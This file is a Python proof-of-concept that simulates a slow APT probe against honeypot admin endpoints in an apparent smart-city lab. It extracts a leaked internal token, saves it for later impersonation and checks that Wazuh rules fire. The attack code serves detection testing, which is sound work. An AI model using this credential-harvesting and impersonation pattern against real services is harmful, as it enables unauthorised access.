#!/usr/bin/env python3
"""
Threat 2 PoC: APT / C2 simulation — low-and-slow honeypot probing + credential extraction.

Attack chain:
  1. Probe /api/admin/config and /api/admin/metrics (triggers Wazuh rule 100200)
  2. /api/admin/config leaks the internal_token (misconfigured debug endpoint)
  3. Extracted token is saved to /tmp/sc_extracted_token.txt for use by spam_attack.py
  4. After 3+ hits Wazuh rule 100201 fires (APT confirmed)

Run from the Debian VM — the script auto-detects the smartcity-services Incus IP.
Port 5100 must be exposed (added in docker-compose.yml).

Usage:
    python3 poc/apt_attack.py [--target http://<ip>:5100] [--probes 5] [--delay 30]
"""
import argparse
import json
import subprocess
import time
import urllib.request
import urllib.error
from datetime import datetime

TOKEN_FILE = "/root/sc_token.txt"


def _incus_ip(container="smartcity-services"):
    """Return the eth0 IPv4 of an Incus container, or None if not found."""
    try:
        out = subprocess.check_output(
            ["incus", "list", container, "-f", "csv", "-c", "4"],
            stderr=subprocess.DEVNULL, text=True,
        ).strip()
        for line in out.splitlines():
            if "eth0" in line:
                return line.split()[0]
        return None
    except Exception:
        return None


_ip = _incus_ip()
_default_target = f"http://{_ip}:5100" if _ip else "http://localhost:5100"

parser = argparse.ArgumentParser(description="APT PoC — honeypot probing + credential extraction")
parser.add_argument("--target", default=_default_target, help="Zone aggregator-north URL")
parser.add_argument("--probes", type=int, default=5, help="Number of probe rounds")
parser.add_argument("--delay", type=float, default=30.0, help="Delay between rounds (seconds)")
args = parser.parse_args()

HONEYPOT_PATHS = ["/api/admin/config", "/api/admin/metrics"]

print(f"[*] APT PoC — target: {args.target}")
print(f"[*] {args.probes} rounds × {len(HONEYPOT_PATHS)} endpoints, {args.delay}s between rounds")
print(f"[*] Detection: Wazuh rule 100201 (3+ HONEYPOT_HIT in 5 min, same IP)")
print()

extracted_token = None

for i in range(1, args.probes + 1):
    for path in HONEYPOT_PATHS:
        url = args.target + path
        try:
            with urllib.request.urlopen(url, timeout=5) as resp:
                raw = resp.read(1024).decode()
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Round {i}  GET {path} -> 200")

            # /api/admin/config leaks the internal_token — extract it on first hit
            if path == "/api/admin/config" and extracted_token is None:
                try:
                    data = json.loads(raw)
                    token = data.get("config", {}).get("internal_token")
                    if token:
                        extracted_token = token
                        with open(TOKEN_FILE, "w") as f:
                            f.write(token)
                        print(f"[!] CREDENTIAL LEAK — internal_token extracted from /api/admin/config")
                        print(f"[!] Token: {token}")
                        print(f"[!] Saved to {TOKEN_FILE}")
                        print(f"[!] Can now impersonate internal services — run spam_attack.py next")
                except Exception:
                    pass

        except urllib.error.HTTPError as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Round {i}  GET {path} -> HTTP {e.code}")
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Round {i}  GET {path} -> ERROR {e}")

    if i < args.probes:
        print(f"    ... sleeping {args.delay}s (simulating low-and-slow C2 keep-alive) ...")
        time.sleep(args.delay)

total = args.probes * len(HONEYPOT_PATHS)
print()
print(f"[+] Done. {args.probes} rounds × {len(HONEYPOT_PATHS)} endpoints = {total} requests")
print(f"[+] Wazuh:      rule 100200 (HONEYPOT_HIT), 100201 (APT confirmed — 3+ hits same IP)")
print(f"[+] Prometheus: wazuh_alerts_total{{rule_id='100200'}}")
if extracted_token:
    print(f"[+] Next step:  python3 poc/spam_attack.py  (token already saved to {TOKEN_FILE})")
else:
    print(f"[!] Token not extracted — check that zone-aggregator-north is reachable")
